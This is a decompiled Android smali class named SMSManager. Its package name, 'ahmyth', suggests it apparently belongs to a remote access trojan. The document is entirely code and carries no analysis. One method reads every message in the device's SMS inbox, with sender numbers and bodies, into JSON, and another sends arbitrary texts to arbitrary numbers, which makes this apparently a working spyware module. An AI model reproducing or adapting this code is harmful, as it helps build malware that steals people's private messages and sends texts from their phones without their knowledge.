.class public Lahmyth/mine/king/ahmyth/SMSManager;
.super Ljava/lang/Object;
.source "SMSManager.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 16
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getSMSList()Lorg/json/JSONObject;
    .locals 14

    .prologue
    const/4 v13, 0x0

    .line 21
    :try_start_0
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    .line 22
    .local v6, "SMSList":Lorg/json/JSONObject;
    new-instance v11, Lorg/json/JSONArray;

    invoke-direct {v11}, Lorg/json/JSONArray;-><init>()V

    .line 25
    .local v11, "list":Lorg/json/JSONArray;
    const-string v0, "content://sms/inbox"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 26
    .local v1, "uriSMSURI":Landroid/net/Uri;
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v9

    .line 28
    .local v9, "cur":Landroid/database/Cursor;
    :goto_0
    invoke-interface {v9}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 29
    new-instance v12, Lorg/json/JSONObject;

    invoke-direct {v12}, Lorg/json/JSONObject;-><init>()V

    .line 30
    .local v12, "sms":Lorg/json/JSONObject;
    const-string v0, "address"

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 31
    .local v7, "address":Ljava/lang/String;
    const-string v0, "body"

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 32
    .local v8, "body":Ljava/lang/String;
    const-string v0, "phoneNo"

    invoke-virtual {v12, v0, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 33
    const-string v0, "msg"

    invoke-virtual {v12, v0, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 34
    invoke-virtual {v11, v12}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 40
    .end local v1    # "uriSMSURI":Landroid/net/Uri;
    .end local v7    # "address":Ljava/lang/String;
    .end local v8    # "body":Ljava/lang/String;
    .end local v9    # "cur":Landroid/database/Cursor;
    .end local v11    # "list":Lorg/json/JSONArray;
    .end local v12    # "sms":Lorg/json/JSONObject;
    :catch_0
    move-exception v10

    .line 41
    .local v10, "e":Lorg/json/JSONException;
    invoke-virtual {v10}, Lorg/json/JSONException;->printStackTrace()V

    move-object v6, v13

    .line 44
    .end local v6    # "SMSList":Lorg/json/JSONObject;
    .end local v10    # "e":Lorg/json/JSONException;
    :goto_1
    return-object v6

    .line 37
    .restart local v1    # "uriSMSURI":Landroid/net/Uri;
    .restart local v6    # "SMSList":Lorg/json/JSONObject;
    .restart local v9    # "cur":Landroid/database/Cursor;
    .restart local v11    # "list":Lorg/json/JSONArray;
    :cond_0
    :try_start_1
    const-string v0, "smsList"

    invoke-virtual {v6, v0, v11}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 38
    const-string v0, "done"

    const-string v2, "collecting"

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method

.method public static sendSMS(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 7
    .param p0, "phoneNo"    # Ljava/lang/String;
    .param p1, "msg"    # Ljava/lang/String;

    .prologue
    .line 50
    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 51
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    const/4 v2, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    move-object v1, p0

    move-object v3, p1

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 52
    const/4 v1, 0x1

    .line 55
    .end local v0    # "smsManager":Landroid/telephony/SmsManager;
    :goto_0
    return v1

    .line 53
    :catch_0
    move-exception v6

    .line 54
    .local v6, "ex":Ljava/lang/Exception;
    invoke-virtual {v6}, Ljava/lang/Exception;->printStackTrace()V

    .line 55
    const/4 v1, 0x0

    goto :goto_0
.end method
